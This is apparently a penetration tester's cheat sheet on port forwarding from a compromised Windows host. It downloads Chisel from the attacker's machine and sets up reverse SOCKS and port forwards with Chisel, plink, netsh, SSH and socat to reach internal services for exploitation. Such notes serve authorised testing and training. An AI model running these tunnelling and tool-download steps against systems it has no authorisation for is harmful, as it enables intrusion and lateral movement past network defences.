---
tags:
  - Foundational
  - Windows
---

## Port Forwarding
resources: [Chisel](https://github.com/jpillora/chisel) | [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) | [HackTricks - Tunneling](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html)

> [!info] Forward internal services (127.0.0.1) to your attack machine for exploitation.

### Chisel - Reverse SOCKS Proxy
> [!tip] Full proxy access to internal network through the target.

#### [Local] Start Chisel Server
```bash
./chisel server -p 8000 --reverse
```

#### [Remote] Connect as SOCKS Proxy
```powershell
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/chisel.exe','ch.exe')
```

```cmd
.\ch.exe client <KaliIP>:8000 R:socks
```

#### [Local] Use Proxy
```bash
# Add to /etc/proxychains4.conf
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 127.0.0.1
proxychains curl http://127.0.0.1:<Port>
```

### Chisel - Single Port Forward
> [!tip] Forward one specific port to Kali.

#### [Local] Start Chisel Server
```bash
./chisel server -p 8000 --reverse
```

#### [Remote] Forward Port
```cmd
.\ch.exe client <KaliIP>:8000 R:<KaliPort>:127.0.0.1:<TargetPort>
```

#### [Local] Access Forwarded Service
```bash
# Service now accessible at 127.0.0.1:<KaliPort>
curl http://127.0.0.1:<KaliPort>
```

### Plink - SSH Port Forward [alternative]
> [!info] Use when SSH is available on Kali. Requires credentials.

```cmd
plink.exe -l <KaliUser> -pw <Password> -R <KaliPort>:127.0.0.1:<TargetPort> <KaliIP>
```

### Netsh - Windows Native [alternative]
> [!important] No tools needed, but requires admin privileges.

```cmd
netsh interface portproxy add v4tov4 listenport=<ListenPort> listenaddress=0.0.0.0 connectport=<TargetPort> connectaddress=127.0.0.1

netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<ListenPort> listenaddress=0.0.0.0
```

### SSH Local Port Forward [alternative]
> [!tip] Forward traffic from local port through SSH server to reach internal host. Then browse to `http://localhost:<LocalPort>`.

```bash
ssh -L <LocalPort>:<TargetHost>:<TargetPort> <User>@<SSHServer>
```

#### Background SSH Tunnel [optional]
```bash
ssh -fNL <LocalPort>:<TargetHost>:<TargetPort> <User>@<SSHServer>
```

### SSH Remote Port Forward [alternative]
> [!tip] Expose local service through SSH server (reverse tunnel).

```bash
ssh -R <RemotePort>:localhost:<LocalPort> <User>@<SSHServer>
```

### SSH Dynamic Port Forward (SOCKS) [alternative]
> [!tip] Create SOCKS proxy to route traffic through SSH server.

```bash
ssh -D <LocalPort> <User>@<SSHServer>
```

#### Use with proxychains [optional]
> [!info] Add `socks5 127.0.0.1 <LocalPort>` to `/etc/proxychains4.conf`.

```bash
proxychains nmap -sT -Pn <TargetIP>
```

### Socat Port Forward [alternative]
> [!tip] Simple TCP port forwarding. Useful for quick redirects.

```bash
socat TCP-LISTEN:<LocalPort>,fork TCP:<Target>:<TargetPort>
```
